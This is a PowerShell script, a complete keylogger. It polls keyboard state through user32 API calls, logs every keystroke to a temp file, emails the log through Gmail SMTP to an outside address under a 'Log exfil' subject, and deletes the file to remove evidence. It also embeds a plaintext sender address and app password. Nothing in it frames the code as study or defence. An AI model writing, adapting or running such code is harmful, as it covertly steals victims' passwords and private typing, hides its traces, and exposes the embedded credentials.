# set config for email
$From = "injectionkeystroke@gmail.com"
$To = "maklo119@hhu.de"
$Subject = "Log exfil from $($env:computername) User: $($env:UserName)"
$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password

function Logger($logFile="$env:temp/a.log") {
  #check if logger needs to create file
  if (Test-Path $logFile) {
    # Send mail
    Send-MailMessage -From $From -To $To -Subject $Subject -Body (Get-Content -Path $logFile) -SmtpServer "smtp.gmail.com" -port 587 -Credential $Credential -UseSsl
    # Remove evidence
    Remove-Item $logFile -Force
  }

  # generate log file
  # assign to variable to avoid console output
  $null = New-Item -ItemType File -Path $logFile  -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # set up API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # attempt to log keystrokes
  try {
    while ($true) {
      #need variable to store if ctrl is presed, because it is represented with multiple ascii values
      $CTRL_First = $false;
      #iterate through all keys to see if they are pressed
      for ($ascii = 8; $ascii -le 254; $ascii++) {
        #get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # check if key is pressed
        if ($keystate -eq -32767) {
          switch ($ascii) {
            8 { "|BACK|" | Out-File -FilePath $logFile -Append -NoNewline }
            9 { "|TAB|" | Out-File -FilePath $logFile -Append -NoNewline }
            17 { $CTRL_First = $true }
            27 { "|ESC|" | Out-File -FilePath $logFile -Append -NoNewline}
            46 { "|ENTF|" | Out-File -FilePath $logFile -Append -NoNewline }
            91 { "|GUI|" | Out-File -FilePath $logFile -Append -NoNewline}
            # special case to log the keys F1 to F12
            { $_ -ge 112 -and $_ -le 123 } { "|F$($_ - 111)|" | Out-File -FilePath $logFile -Append -NoNewline }
            # special case to log the press of ctrl key
            { $CTRL_First -and $_ -eq 162 } { $CTRL_First = $false; "|CTRL|" | Out-File -FilePath $logFile -Append -NoNewline } 
            # default case 
            default{
              $null = [console]::CapsLock
              # map virtual key
              $mapKey = $API::MapVirtualKey($ascii, 3)
              # get keyboard state and create stringbuilder
              $keyboardState = New-Object Byte[] 256
              $null = $API::GetKeyboardState($keyboardState)
              $loggedchar = New-Object -TypeName System.Text.StringBuilder
              # translate virtual key
              if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                # add logged key to file
                [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
              }
            }
          } 
        }
      }
      #check if the file reached size and send if so
      if ((Get-Item -Path $logFile).Length -ge 500) {
        Send-MailMessage -From $From -To $To -Subject $Subject -Body (Get-Content -Path $logFile) -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
        Clear-Content -Path $logFile
      }
    }
  }

  # send logs if code fails
  finally {
    # notepad $logFile
    # Send mail
    Send-MailMessage -From $From -To $To -Subject $Subject -Body (Get-Content -Path $logFile) -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
    # Remove evidence
    Remove-Item $logFile -Force
  }
}
# run logger
# Logger
